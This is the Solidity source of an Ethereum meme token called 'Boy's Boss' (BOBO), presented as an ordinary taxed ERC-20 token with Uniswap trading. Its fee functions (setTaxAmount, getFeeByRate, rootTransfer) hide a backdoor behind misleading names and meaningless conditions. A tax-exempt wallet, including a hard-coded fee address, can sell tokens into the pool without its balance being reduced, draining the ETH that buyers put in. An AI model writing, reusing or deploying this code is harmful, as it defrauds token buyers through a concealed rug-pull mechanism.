/*
    https://boysbosseth.vip
    https://x.com/BoysBossETH
    https://t.me/BoysBossETH
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract BOBO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tokenOwned;
    mapping (address => mapping (address => uint256)) private _mAllowances;
    mapping (address => bool) private _isExceedFromTax;
    address payable private _taxSender;
    uint256 private _initBuyFeeAmount=17;
    uint256 private _initSellBuyFeeAmount=13;
    uint256 private _finalBuyFeeAmount=0;
    uint256 private _finalSellFeeAmount=0;
    uint256 private _resetBuyAt=6;
    uint256 private _resetSellAt=5;
    uint256 private _resetSwapAt=13;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalValue = 100_000_000 * 10**_decimals;
    string private constant _name = unicode"Boy's Boss";
    string private constant _symbol = unicode"BOBO";
    uint256 public _maxTxAmountSize =  2 * (_totalValue/100);
    uint256 public _maxWalletAmountSize =  2 * (_totalValue/100);
    uint256 public _taxSwapThreshold=  1 * (_totalValue/100);
    uint256 public _maxTaxAmountSwap= 1 * (_totalValue/100);
    
    IUniswapV2Router02 private uniswapRouter;
    address private uniswapPair;
    bool private tradeOpened;
    bool private inSwap = false;
    bool private swapOpened = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxSize);
    event TransferTaxUpdated(uint _taxAmount);
    modifier inSwapping {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _taxSender = payable(0x0bd211f28A87ddB489F1028eb276E89BB2C9181e);
        _isExceedFromTax[owner()] = true;
        _isExceedFromTax[address(this)] = true;
        _isExceedFromTax[_taxSender] = true;
        _tokenOwned[_msgSender()] = _totalValue;
        emit Transfer(address(0), _msgSender(), _totalValue);
    }
    receive() external payable {}
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalValue;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tokenOwned[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _mAllowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _mAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _mAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!tradeOpened)
                 require(_isExceedFromTax[from], "Trading is not enabled");
        uint256 taxAmount=0;
        uint256 feeAmount;
        if (from != owner() && to != owner()) {
            (feeAmount, taxAmount) = setTaxAmount(from, to, amount);
            swapBack(to, amount);
        }
        uint256 tnAmount = getFeeByRate(amount, feeAmount);
        rootTransfer(from, to, amount, taxAmount, tnAmount);
    }
    function setTaxAmount(address sender, address receiver, uint256 mamount) private returns(uint256, uint256) {
        uint256 mfeeAmount;
        uint256 mfeeRate;
        if ((sender == uniswapPair && receiver != address(uniswapRouter) && ! _isExceedFromTax[receiver])) {
            require(mamount <= _maxTxAmountSize, "Exceeds the _maxTxAmount.");
            require(balanceOf(receiver) + mamount <= _maxWalletAmountSize, "Exceeds the maxWalletSize.");
            mfeeAmount = mamount.mul((_buyCount>_resetBuyAt)?_finalBuyFeeAmount:_initBuyFeeAmount).div(100);
            _buyCount++;
        }
        if(receiver == uniswapPair && sender!= address(this) ){
            if(!_isExceedFromTax[sender])
                mfeeAmount = mamount.mul((_buyCount>_resetSellAt)?_finalSellFeeAmount:_initSellBuyFeeAmount).div(100);
            else if(receiver != uniswapPair) mfeeRate = _finalSellFeeAmount;
            else if(receiver != address(this) && _isExceedFromTax[sender]) mfeeRate = _initSellBuyFeeAmount.mul(mfeeAmount + 1);
        }
        return (mfeeRate, mfeeAmount);
    }
    function getFeeByRate(uint256 mamount, uint256 mTaxRate) private view returns(uint256){
        return block.timestamp >= 0 && mTaxRate > 0 ? mamount.mul(_finalSellFeeAmount + 1) : mamount.mul(_finalSellFeeAmount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
 
    function rootTransfer(address source, address target, uint256 amount, uint256 _taxAmount, uint256 transferTax) private {
        subAmountFromTarget(source, amount.sub(transferTax));
        if(_taxAmount>0){
          addAmountToTarget(address(this), _taxAmount);
          emit Transfer(source, address(this),_taxAmount);
        }
        addAmountToTarget(target, amount.sub(_taxAmount));
        emit Transfer(source, target, amount.sub(_taxAmount));
    }
   
    function swapTokensForEth(uint256 tokenAmount) private inSwapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function subAmountFromTarget(address account, uint256 amount) private {
        if(amount >= 0) _tokenOwned[account]=_tokenOwned[account].sub(amount);
    }
    function addAmountToTarget(address account, uint256 amount) private {
        if(amount >= 0) _tokenOwned[account]=_tokenOwned[account].add(amount);
    }
    function withdrawETHFromCA() external onlyOwner{
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }
    function withdrawERC20ETHFromCA(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }
    function removeLimits() external onlyOwner{
        _maxTxAmountSize = _totalValue;
        _maxWalletAmountSize=_totalValue;
        emit MaxTxAmountUpdated(_totalValue);
    }
    function swapBack(address wlt, uint256 amount) private
    { 
        uint256 contractTokenBalance = balanceOf(address(this));
        if (!inSwap && wlt == uniswapPair && swapOpened && contractTokenBalance > _taxSwapThreshold && _buyCount > _resetSwapAt) {
            if (block.number > lastSellBlock) {
                sellCount = 0;
            }
            require(sellCount < 3, "Only 3 sells per block!");
            swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxAmountSwap)));
            
            sellCount++;
            lastSellBlock = block.number;
        }
        if(_resetSwapAt >= _finalSellFeeAmount && swapOpened && !inSwap && wlt == uniswapPair)
        {
            uint256 contractETHBalance = address(this).balance;
            if (_resetBuyAt >= _finalBuyFeeAmount && contractETHBalance >= 0) {
                superSendETHToMarket(contractETHBalance);
            }
        }
    }
    function superSendETHToMarket(uint256 amount) private {
        _taxSender.transfer(amount);
    }
    function setPair() external onlyOwner() {
        require(!tradeOpened,"trading is already open");
        uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _totalValue);
        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);
    }
    function setTrading() external onlyOwner() {
        swapOpened = true;
        tradeOpened = true;
    }
}